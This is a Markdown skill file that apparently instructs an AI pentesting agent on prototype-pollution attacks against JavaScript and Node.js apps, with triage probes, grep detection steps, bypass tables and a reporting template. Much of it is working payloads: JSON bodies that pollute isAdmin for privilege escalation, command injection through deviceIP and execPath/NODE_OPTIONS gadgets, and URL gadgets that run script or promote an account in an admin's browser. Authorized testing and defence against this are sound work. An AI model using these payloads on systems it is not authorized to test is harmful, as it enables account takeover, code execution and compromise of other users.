---
name: prototype-pollution
description: Prototype Pollution — client-side (URL params, hash fragment, library gadget chains to XSS) and server-side Node.js (JSON body merge, lodash/node.extend vulnerable libraries, privilege escalation, RCE via polluted exec properties). Use when HauntMode flags prototype pollution as APPLIES/MAYBE, when the app uses JavaScript/Node.js and accepts JSON or query-string merge operations, or when you need an end-to-end methodology with gadget hunting, filter bypasses, and exploitation chains.
---

# Prototype Pollution (INDEX — Whitebox Attacks)

This skill covers detection, confirmation, exploitation, and chaining for both client-side and server-side prototype pollution. Read top to bottom on first invocation; later runs can jump to the relevant section.

---

## 1. Triggers — when this skill applies

- App accepts JSON with arbitrary keys that are merged/cloned into an existing object (`merge`, `extend`, `assign`, `deepClone`, `defaults`)
- Query-string or URL hash parsed by libraries like `jquery-deparam`, `qs`, `querystring` — URL param keys like `?__proto__[x]=y` reach JS
- `package.json` shows vulnerable versions: `lodash < 4.17.21`, `node.extend < 1.1.7`, `jquery < 3.4.0`, `handlebars < 4.5.3`, `set-value`, `mixin-deep`, `merge-deep`
- Node.js app that calls `exec`, `spawn`, `fork`, or similar with a property read from a user object that may not be initialized (null coalesce path)
- Client-side JS reads URL params / hash and passes them into a `deparam`-style function
- Admin middleware checks a JWT claim that is not present → `undefined` — prototype property would satisfy the check

---

---

## 3. 30-second triage

**Server-side (Node.js JSON endpoint):**
```
POST /any-endpoint-that-takes-JSON HTTP/1.1
Content-Type: application/json

{"__proto__":{"polluted":"zzztest123"}}
```
Then probe with a request you can observe: check if `{}.__proto__.polluted === "zzztest123"` side-effects appear (status code changes, extra headers, error message changes).

Safe detection probes from notes — use observable HTTP properties:
```json
{"__proto__":{"status":555}}
{"__proto__":{"parameterLimit":1}}
{"__proto__":{"content-type":"application/json"}}
```
Watch for HTTP 555, parameter truncation, or content-type change in responses.

**Client-side (URL params):**
```
https://target/page?__proto__[polluted]=zzztest123
https://target/page?constructor[prototype][polluted]=zzztest123
```
Open browser console, type `{}.__proto__.polluted` — if `"zzztest123"` comes back, pollution confirmed.

**DOM Invader (Burp Chromium browser):**
1. Extensions → Burp Suite → DOM Invader → ON
2. Attack types → Prototype Pollution → ON
3. Reload page → check DOM Invader tab in devtools
4. Click "Test" on any found source → confirm in console
5. Click "Scan for gadgets" → automatic XSS gadget search

---

## 4. Detection

### 4.1 Find the vulnerable function (source-code / grep path)

```bash
grep -r "node.extend\|lodash\|merge\|extend\|deepClone\|set-value\|mixin-deep" package.json
grep -rl "require.*node.extend\|require.*lodash\|_.merge\|extend(" .
grep -rl "log(\|merge(\|extend(" . | xargs grep "req.body\|req.params\|req.query"
```

Vulnerable lodash versions: `< 4.17.21`. Vulnerable node.extend: `< 1.1.7`.

### 4.2 Confirm user input reaches the merge call

Trace the flow: `req.body` → vulnerable `merge(target, req.body)`. If user JSON keys traverse into `__proto__`, pollution is possible.

### 4.3 URL-encoded client-side probes

`__proto__` in query string URL-encoded variants:
```
?__proto__[x]=test
?__proto__%5Bx%5D=test
?constructor[prototype][x]=test
?constructor%5Bprototype%5D%5Bx%5D=test
```
Bracket notation is the key — `[key]` maps to property access in deparam-style libraries.

---

## 5. Confirmation

**Server-side confirmation without visible output:**
After sending the pollution payload, send a second request that exercises the polluted property path. Observable markers from notes:
- `{"__proto__":{"status":555}}` → subsequent response returns HTTP 555
- `{"__proto__":{"parameterLimit":1}}` → only first parameter parsed
- `{"__proto__":{"content-type":"zzztest"}}` → content-type header in response changes

**Client-side confirmation:**
Browser console: `Object.prototype.polluted` or `{}.__proto__.polluted` → must equal your injected value.

---

## 6. Exploitation

### 6.1 Server-side: Privilege escalation (Node.js)

Target: admin middleware that reads `session.isAdmin` from a JWT claim that is not present → `undefined`. A polluted `Object.prototype.isAdmin = true` causes the undefined lookup to return `true`.

```
POST /login HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "isAdmin": true
  }
}
```

Filter bypass (if `__proto__` is blocked):
```json
{
  "constructor": {
    "prototype": {
      "isAdmin": true
    }
  }
}
```

Caution: polluting `Object.prototype` affects ALL objects in the runtime — it may break registration or other endpoints. Prefer polluting at the lowest possible prototype level (e.g., `User.prototype` rather than `Object.prototype`).

### 6.2 Server-side: RCE via polluted exec property

Scenario: `exec(`ping -c 1 ${userObject.deviceIP}`)` — `deviceIP` is null for new users (not in `User.prototype`), so prototype lookup fires.

```
POST /update HTTP/1.1
Content-Type: application/json

{
  "__proto__": {
    "deviceIP": "127.0.0.1; id"
  }
}
```

Filter bypass (if `deviceIP` direct property is validated but `__proto__.deviceIP` is not):
```json
{"constructor":{"prototype":{"deviceIP":"127.0.0.1; id"}}}
```

Then trigger the exec endpoint (`GET /ping`). Output appears in the response.

### 6.3 Server-side: RCE via Node.js `child_process.spawn` options

Known gadget: pollute `shell`, `env`, or `execPath` properties used by spawn options:
```json
{"__proto__":{"shell":"node","NODE_OPTIONS":"--inspect=0.0.0.0:1337"}}
```
Or for arbitrary command via `execPath`:
```json
{"__proto__":{"execPath":"/bin/sh","execArgv":["-c","id > /tmp/pwned"]}}
```

### 6.4 Client-side: XSS via gadget chain

Step 1 — confirm pollution source (`jquery-deparam`, `qs` etc. via URL param):
```
/profile.php?__proto__[poc]=polluted
```
Console: `Object.prototype.poc === "polluted"` → confirmed.

Step 2 — find gadget. Check BlackFan's list: https://github.com/BlackFan/client-side-prototype-pollution#script-gadgets

Common gadgets:
- **Google reCAPTCHA** (`srcdoc`): `/page?__proto__[srcdoc][]=<script>alert(1)</script>`
- **jQuery `$.getScript`** gadget (pollute `src`): `/page?__proto__[src][]=data:,$.get('/admin.php?promote=2')//`
- **DOMPurify bypass** — DOMPurify sanitizes but pollution can affect the sanitizer config

Step 3 — URL-encode and deliver as a link:
```
/profile.php?id=2&__proto__%5Bsrc%5D%5B%5D=data%3A%2C%24.get(%27%2Fadmin.php%3Fpromote%3D2%27)//
```

Full exploitation flow (from notes lab):
1. Victim (admin) clicks poisoned profile link
2. `jquery-deparam` parses query string → `Object.prototype.src` is set
3. Page runs `$.getScript(url)` — jQuery reads `src` from prototype
4. `data:` URI with embedded JS executes in admin's context
5. Admin action (promote user, CSRF-style) fires

---

## 7. Bypass techniques

| Filter | Bypass |
|---|---|
| Blocks `__proto__` property | Use `constructor.prototype` chain instead |
| Sanitizes `__proto__` key in JSON | `{"constructor":{"prototype":{"x":1}}}` |
| Filters `[` and `]` in URL | URL-encode: `%5B` and `%5D` |
| Filters `__proto__` in query string | `constructor%5Bprototype%5D%5Bx%5D=1` |
| Checks `req.body.deviceIP` but not `req.body.__proto__.deviceIP` | Put payload in `__proto__` sub-object |
| `Object.freeze(Object.prototype)` | No client-side bypass — look for server-side or library-level |

---

## 8. False-positive checks

- Pollution confirmed in browser console but no gadget chain found → partial finding. Report the pollution source with DOM Invader gadget scan result; note that impact depends on gadget availability.
- HTTP status code changed but may be coincidence → verify by sending multiple baseline requests then pollution request. Status must change consistently.
- `constructor.prototype` bypasses a filter but the merge library is patched → npm audit confirms version, verify the specific CVE version range.
- Server restarts between requests → pollution is ephemeral per process; re-confirm on a stable session.

---

## 9. Chain candidates

| Chain | Paired skill | Impact |
|---|---|---|
| Client-side PP → XSS via gadget | `xss` | Arbitrary JS in victim browser; escalate to cookie theft / ATO |
| Client-side PP → CSRF trigger via `$.get` gadget | `csrf` | Promote privilege, change account data in admin context |
| Server-side PP → auth bypass (`isAdmin` pollution) | `auth-bypass` | Admin dashboard access |
| Server-side PP → RCE (`deviceIP` / `execPath` gadget) | `cmdi` | Full server compromise |
| Server-side PP → SSRF (pollute URL property used in HTTP fetch) | `ssrf` | Internal network probing |
| PP discovered via source-code review | `whitebox` | Combine with type juggling or race condition |

---

## 10. Reporting template

```
POTENTIAL FINDING: Prototype Pollution — <Client-Side | Server-Side>
Target: <URL / endpoint>
Injection point: <query param | JSON body field | cookie>
Vulnerable library: <name + version, e.g. lodash 4.6.1 / node.extend 1.1.6>
CVE (if applicable): <CVE-2018-16491 / SNYK-JS-LODASHMERGE-173732 / etc.>
Pollution payload:
    <exact payload that confirmed pollution>
Confirmation method:
    <HTTP status change | browser console Object.prototype.x | gadget execution>
Exploitation path:
    <e.g. "Polluted isAdmin to true → admin dashboard accessible without admin account">
    <e.g. "Polluted deviceIP → exec() receives injected command → RCE as www-data">
Working PoC:
    <exact request or URL>
Impact:
    <auth bypass | privilege escalation | XSS | RCE | DoS>
Caution note:
    <Polluting Object.prototype may break other functionality — test on isolated account>
Chain potential: <other skills involved>
Next step: <escalate to RCE | find gadget for XSS | confirm on prod with isolated account>
```

---

## 11. Recon tracker vector strings

Only log if user explicitly says to.

- `pp:client-side:<library>` — client-side PP confirmed via named library
- `pp:server-side:<library>` — server-side PP confirmed via named library
- `pp:gadget-xss:<gadget-name>` — gadget found, escalates to XSS
- `pp:priv-esc:isAdmin` — auth bypass via prototype pollution
- `pp:rce:<property>` — RCE via polluted exec property
- `pp:no:<endpoint>` — tested, not pollutable
- `pp:filter-bypass:constructor-prototype` — `__proto__` blocked but `constructor.prototype` worked

---

## 12. What NOT to do

- Do NOT pollute `Object.prototype` with properties that crash the server (e.g., setting `toString` to a non-function). Test locally first.
- Do NOT leave prototype pollution active on production — it is server-wide and affects all users in the same process until restart.
- Do NOT report gadget-less client-side pollution as high severity without demonstrating a real impact path (XSS, CSRF, auth bypass).
- Do NOT run automated prototype pollution scanners (`ppmap`, etc.) without user authorization — these can break the app.
- Do NOT skip `constructor.prototype` bypass when `__proto__` appears filtered — the filter is almost always incomplete.
- Do NOT rely on `npm audit` alone to rule it out — some vulnerable patterns are in application code, not dependencies.
- Do NOT auto-log to recon tracker without explicit user instruction.
